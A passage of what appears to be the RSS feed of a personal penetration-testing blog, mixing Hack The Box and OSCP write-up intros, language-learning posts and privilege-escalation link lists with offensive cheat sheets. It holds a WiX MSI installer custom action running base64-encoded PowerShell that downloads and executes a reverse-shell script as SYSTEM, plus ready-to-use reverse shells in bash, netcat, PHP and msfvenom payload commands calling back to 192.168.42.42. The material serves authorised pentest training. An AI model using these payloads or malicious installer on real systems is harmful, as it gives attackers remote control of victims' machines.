+ &amp;lt;Directory Id=&amp;#34;INSTALLLOCATION&amp;#34; Name=&amp;#34;Example&amp;#34;&amp;gt;
+ &amp;lt;Component Id=&amp;#34;ApplicationFiles&amp;#34; Guid=&amp;#34;12345678-1234-1234-1234-222222222222&amp;#34;&amp;gt;
+ &amp;lt;/Component&amp;gt;
+ &amp;lt;/Directory&amp;gt;
+ &amp;lt;/Directory&amp;gt;
+ &amp;lt;/Directory&amp;gt;
+ &amp;lt;Feature Id=&amp;#34;DefaultFeature&amp;#34; Level=&amp;#34;1&amp;#34;&amp;gt;
+ &amp;lt;ComponentRef Id=&amp;#34;ApplicationFiles&amp;#34;/&amp;gt;
+ &amp;lt;/Feature&amp;gt;
+ &amp;lt;CustomAction Id=&amp;#34;SystemShell&amp;#34; Directory=&amp;#34;TARGETDIR&amp;#34; ExeCommand=&amp;#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+.exe -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAC
+gAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA5ADIALwBuAGkAZQByAGkALgBwAHMAMQAnACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBj
+AHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOA
+AuADQAOQAuADkAMgAvAHIAdQBuAC0AcwBoAGUAbABsAGMAbwBkAGUALQA2ADQAYgBpAHQALgBwAHMAMQAtAGYAcgBvAG0AOQAyAC0AOAAwADgAMQBwAG8AcgB0ACcA
+KQAKAA==&amp;#34; Execute=&amp;#34;deferred&amp;#34; Impersonate=&amp;#34;no&amp;#34; Return=&amp;#34;ignore&amp;#34;/&amp;gt;
+ &amp;lt;InstallExecuteSequence&amp;gt;
+ &amp;lt;Custom Action=&amp;#34;SystemShell&amp;#34; After=&amp;#34;InstallInitialize&amp;#34;&amp;gt;&amp;lt;/Custom&amp;gt;
+ &amp;lt;/InstallExecuteSequence&amp;gt;
+ &amp;lt;/Product&amp;gt;
+&amp;lt;/Wix&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The powershell in b64 executed is this one:&lt;/p&gt;</description></item><item><title>Windows</title><link>https://ceso.github.io/resources/operating_systems/windows/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/operating_systems/windows/</guid><description>&lt;h1 id="general"&gt;General&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf"&gt;http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.lemoda.net/windows/windows2unix/windows2unix.html"&gt;https://www.lemoda.net/windows/windows2unix/windows2unix.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html"&gt;https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/"&gt;https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html"&gt;https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://malicious.link/post/2016/kerberoast-pt1/"&gt;https://malicious.link/post/2016/kerberoast-pt1/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4"&gt;https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash; DotNetNuke (CVE-2017-9822) Payloads&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id="privilege-escalation"&gt;Privilege Escalation&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/"&gt;https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.fuzzysecurity.com/tutorials/16.html"&gt;http://www.fuzzysecurity.com/tutorials/16.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md"&gt;https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/worawit/MS17-010"&gt;https://github.com/worawit/MS17-010&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;&amp;mdash; Eternal blue without MSF&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/ankh2054/windows-pentest"&gt;https://github.com/ankh2054/windows-pentest&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html"&gt;https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html"&gt;https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/frizb/Windows-Privilege-Escalation"&gt;https://github.com/frizb/Windows-Privilege-Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id="powershell"&gt;PowerShell&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://vipulvyas0813.medium.com/introduction-to-powershell-for-penetration-testing-733236bc9547"&gt;https://vipulvyas0813.medium.com/introduction-to-powershell-for-penetration-testing-733236bc9547&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;&amp;mdash; Serie about Poers
+hell for Penetration Testing (5 posts)&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Bash</title><link>https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/</link><pubDate>Thu, 02 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/</guid><description>&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.42.42/443 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; | nc 192.168.42.42 &lt;span style="color:#ae81ff"&gt;443&lt;/span&gt; &amp;gt;/tmp/f
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Metasploit</title><link>https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/</link><pubDate>Thu, 02 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/</guid><description>&lt;h1 id="perl-example-to-deploy-as-cgi-bin"&gt;Perl (example to deploy as cgi-bin)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;msfvenom -p cmd/unix/reverse_perl LHOST=&amp;#34;192.168.42.42&amp;#34; LPORT=443 -f raw -o reverse_shell.cgi
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="java-example-to-deploy-in-tomcat"&gt;Java (example to deploy in Tomcat)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war rev_shell.war
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="windows---download-reverse-shell"&gt;Windows - Download Reverse Shell&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;msfvenom -a x86 --platform windows -p windows/exec CMD=&amp;#34;powershell \&amp;#34;IEX(New-Object Net.WebClient
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;).downloadString(&amp;#39;http://192.168.42.42/Invoke-PowerShellTcp.ps1&amp;#39;)\&amp;#34;&amp;#34; -e x86/unicode_mixed BufferR
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;egister=EAX -f python
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.42.42 lport=443 -f csharp
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can also use it with the following parameters for migration&lt;/p&gt;</description></item><item><title>PHP</title><link>https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/</link><pubDate>Thu, 02 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/</guid><description>&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; $sock &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;fsockopen&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;192.168.42.42&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;443&amp;#34;&lt;/span&gt;); $proc &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;proc_open&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/bin/sh -i&amp;#34;&lt;/span&gt;, &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&amp;gt;&lt;/span&gt;$sock, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;=&amp;gt;&lt;/span&gt;$sock, &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&amp;gt;&lt;/span&gt;$sock), $pipes); &lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;r&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;$sock=fsockopen(&amp;#34;192.168.42.42&amp;#34;,443);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Wehmütig</title><link>https://ceso.github.io/posts/2025/wehmutig.de/</link><pubDate>Sun, 08 Jun 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2025/wehmutig.de/</guid><description>&lt;img src="https://ceso.github.io/images/blog/general/wehmutig.png" class="center" style="border-radius: 10x;" /&gt;
+
+
+&lt;h1 id="wehmütig"&gt;Wehmütig&lt;/h1&gt;
+&lt;p&gt;Wie der Donner, der dem vorbeiziehenden Blitz folgt, so umarmte sie mich - Verfinsterung&lt;/p&gt;</description></item><item><title>Zerdenken</title><link>https://ceso.github.io/posts/2025/zerdenken.de/</link><pubDate>Sat, 07 Jun 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2025/zerdenken.de/</guid><description>&lt;img src="https://ceso.github.io/images/blog/general/zerdenken.png" class="center" style="border-radius: 10x;" /&gt;
+
+
+&lt;p&gt;Als es April 2022 war, habe ich einen Post auf Schwedisch geschreiben, weil ich angefangen habe, Schwedisch zu lernen. Ich erinnere mich nicht, wann genau ich aufgehört habe, Schwedisch zu lernen.&lt;/p&gt;
+&lt;p&gt;Im Februar 2023 bin ich nach Deutschland umgezogen. Als ich umgezogen bin, habe ich anfangen, um Deutsch zu lernen. Jetzt lerne ich seit ungefähr zwei Jahren Deutsch.&lt;/p&gt;
+&lt;p&gt;Es ist ein bisschen komisch, aber ich habe das Gefühl, dass ich etwas auf Deutsch ausdrucken kann, was ich in meiner Muttersprache (Spanisch) nicht konnte - sogar wenn ich viele Fehler mache.&lt;/p&gt;</description></item><item><title>SOC145 - Ransomware Detected</title><link>https://ceso.github.io/posts/2022/soc145ransomwaredetected/</link><pubDate>Fri, 24 Jun 2022 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/soc145ransomwaredetected/</guid><description>&lt;img src="https://ceso.github.io/images/letsdefend/soc145/ransomware-card.png" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;h2 id="quick-summary"&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;Well, my lab time for OSWE/OSED courses just came to an end and I&amp;rsquo;m still way to far from being able to take their respective exams (still haven&amp;rsquo;t even reached the challenges, stuck on the material/excersises), so just as a way to take a short rest and a change of air from it, I decided to take a look around if there was anything similar to HTB but for Blue Team stuff (I barely know stuff related to it, besides my tasks as Appsec/DevSecOps whatever you want to call it mehh!), by doing this I ended up finding a web page called &amp;ldquo;Lets Defend&amp;rdquo;, it has some ctf alike games but focused exactly on the Blue Team side together with some Training content, which in a really easy and understandable way explains the 101 of SOC/Incident Response/SIEM, etc, pretty nice to have a quick and overview about that stuff, I liked it.&lt;/p&gt;</description></item><item><title>Hur jag är lär mig svenska</title><link>https://ceso.github.io/posts/2022/larmigsvenska.se/</link><pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/larmigsvenska.se/</guid><description>&lt;img src="https://ceso.github.io/images/blog/general/larsvenska.png" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;p&gt;Förneka: Deta blogginlägget har mycket fel, jag vet det, men&amp;hellip;jag vill bara skriva lite om hur jag lär mig svenska, så det är en lite öva för mig, ingenting allvarlig!&lt;/p&gt;
+&lt;p&gt;Vad kan säga jag? Jag gillar hur germanska språk ljud, och jag också gillar många metal-band från sverige (och svenska kultur), för det anledning beslutade jag lär mig svenska (i framtiden jag skulle vilja också lär tyska och holländska).&lt;/p&gt;</description></item><item><title>Three is Company: My adventure getting OSEP towards landing OSCE3</title><link>https://ceso.github.io/posts/2022/threeiscompany/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/threeiscompany/</guid><description>&lt;img src="https://ceso.github.io/images/blog/osep/osep_banner.png" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;h2 id="preface"&gt;Preface&lt;/h2&gt;
+&lt;p&gt;Twenty months have passed since ceso obtained his OSCP and just now in January/2022 got his OSEP, during this time he traveled from the old continent back to his hometown on the other side of the world as there was stuff he needed to sort out. Covid-19 (c-19), the pandemic that started in 2020, was still leaving havoc behind any place where it arrived, and the situation didn&amp;rsquo;t look like getting better any soon. His travel back was not the easiest one as it used to be before the c-19 attacked but still, as it was he was able to return without facing odds.
+Ceso saved some money and made ambitious objectives when it was still 2021; &amp;ldquo;I will get OSCE3!!!&amp;rdquo;, but&amp;hellip;stuff doesn&amp;rsquo;t always go as expected or how we want, and his life started to go downhill in some aspects of his life, health started to be quite
+an issue and all his plans needed to be pushed aside and improving his health turned the top priority.
+Months passed and as he started to feel better, August of 2021 was running and decided it was time, he was ready to continue where he left, time to pick up before all started going downhill; time to go after OSEP and defeat it and the bosses that will be coming afterward (OSWE and OSED).&lt;/p&gt;</description></item><item><title>My Videos</title><link>https://ceso.github.io/videos/</link><pubDate>Sun, 07 Mar 2021 00:00:00 +0000</pubDate><guid>https://ceso.github.io/videos/</guid><description>&lt;p&gt;A compilation of videos from Presentations/Live Streamings given by me.&lt;/p&gt;
+&lt;h2 id="simulation-of-oscp-with-hack-the-box-and-vulnhub-machines"&gt;Simulation of OSCP with Hack The Box and VulnHub machines&lt;/h2&gt;
+&lt;p&gt;Apr 11, 2020&lt;/p&gt;
+&lt;p&gt;Live streaming I did of a simulation of the OSCP Exam with HTB Machines + a Vulnhub machine (BOF), this is video is complemented with my post &lt;a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/"&gt;A Journey in the Dark - An adventure&amp;rsquo;s tale towards OSCP&lt;/a&gt;&lt;/p&gt;
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/FwZc6JigIcE?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
+ &lt;/div&gt;
+
+&lt;h2 id="htb-nl-meetup-03---and-we-start-our-journey"&gt;HTB NL Meetup 03 - And we start our journey&lt;/h2&gt;
+&lt;p&gt;Jun 17, 2020&lt;/p&gt;</description></item><item><title>Q3liZXJzZWMgbXkgd2F 5IC0gUGFydCAxCg==</title><link>https://ceso.github.io/posts/2021/cybersecmyway/</link><pubDate>Sun, 14 Feb 2021 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2021/cybersecmyway/</guid><description>&lt;h2 id="preface"&gt;Preface&lt;/h2&gt;
+&lt;p&gt;Lot of things have happend since the last time I posted something here, such as moving back to my country at the middle of last year to also stopping studying for some months due prioritizing my mental health (2020 was a bitch to all of us).&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;I already talked a bit about my background and how I started to study Cybersec in my prior post related to &lt;a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/"&gt;my experience with OSCP&lt;/a&gt;, you can go there and read about it if you want, but I will repeat some stuff here.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;</description></item><item><title>Hack The Box - Obscurity</title><link>https://ceso.github.io/posts/2020/obscurity/</link><pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/obscurity/</guid><description>&lt;img src="https://ceso.github.io/images/htb/obscurity/info-card.png" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;h2 id="quick-summary"&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it &lt;a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/"&gt;you can click here to go to it&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.&lt;/p&gt;</description></item><item><title>A Journey in the Dark - An adventure's tale towards OSCP</title><link>https://ceso.github.io/posts/2020/ajourneyinthedark/</link><pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/ajourneyinthedark/</guid><description>&lt;img src="https://ceso.github.io/images/blog/oscp/oscp_banner.png" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;h2 id="preface"&gt;Preface&lt;/h2&gt;
+&lt;p&gt;This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.&lt;/p&gt;
+&lt;p&gt;Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.&lt;/p&gt;</description></item><item><title>Hack The Box - AI</title><link>https://ceso.github.io/posts/2020/ai/</link><pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/ai/</guid><description>&lt;img src="https://ceso.github.io/images/htb/ai/info-card.png" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;h2 id="quick-summary"&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
+At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.&lt;/p&gt;
+&lt;p&gt;This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit &lt;a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html"&gt;JWDP&lt;/a&gt;, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different &lt;a href="https://en.wikipedia.org/wiki/Speech_synthesis"&gt;TTS&lt;/a&gt; I didn&amp;rsquo;t like it, in summary, was a box I didn&amp;rsquo;t feel like learning something new at all.&lt;/p&gt;</description></item><item><title>Hack The Box - Bitlab</title><link>https://ceso.github.io/posts/2020/bitlab/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/bitlab/</guid><description>&lt;img src="https://ceso.github.io/images/htb/bitlab/info-card.png" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;h2 id="quick-summary"&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the &lt;code&gt;sudo + git&lt;/code&gt; path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.&lt;/p&gt;</description></item><item><title>Hack The Box - Craft</title><link>https://ceso.github.io/posts/2020/craft/</link><pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/craft/</guid><description>&lt;img src="https://ceso.github.io/images/htb/craft/info-card.png" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;h2 id="quick-summary"&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;So!!
+Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot &lt;a href="https://www.hackthebox.eu/profile/103596"&gt;@Fugl!&lt;/a&gt;), root was easy by a little bit of enumeration and reading help command output.&lt;/p&gt;</description></item><item><title>shutdown -r now</title><link>https://ceso.github.io/posts/2019/shutdown-r-now/</link><pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2019/shutdown-r-now/</guid><description>&lt;p&gt;Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.&lt;/p&gt;
+&lt;p&gt;I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people
+who blogs!&amp;rdquo;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&amp;hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.&lt;/p&gt;</description></item><item><title>Whoami</title><link>https://ceso.github.io/whoami/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ceso.github.io/whoami/</guid><description>&lt;img src="https://ceso.github.io/images/site/av01.jpg" class="center" style="border-radius: 8px;" /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;Uruguayan rock climber nerd in love with learning new stuff all the time&lt;/li&gt;
+&lt;li&gt;DevOps/Linux Sysadmin&lt;/li&gt;
+&lt;li&gt;CyberSec enthusiast, wanting to make a jump into it in the future&lt;/li&gt;
+&lt;li&gt;OSCP/OSEP&lt;/li&gt;
+&lt;/ul&gt;</description></item></channel></rss>
